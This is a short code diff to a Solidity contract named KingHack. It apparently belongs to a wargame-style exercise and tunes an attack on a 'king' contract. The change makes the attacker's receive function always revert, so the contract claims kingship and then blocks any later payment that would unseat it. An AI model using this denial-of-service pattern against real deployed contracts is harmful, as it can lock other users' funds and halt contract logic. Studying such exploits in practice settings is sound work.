@@ -35,7 +35,7 @@ contract KingHack {
     }
 
     function stealReign() public {
-        address(_king).call{value: 1000000000000000, gas: 107705000390820}("");
+        address(_king).call{value: 1000000000000100, gas: 1000000000000000}("");
     }
 
     function getBalance() public returns (uint256) {
@@ -43,10 +43,6 @@ contract KingHack {
     }
 
     receive() external payable {
-        if (tookOwnership) {
-            revert("1");
-        } else {
-            tookOwnership = true;
-        }
+        revert("1");
     }
 }
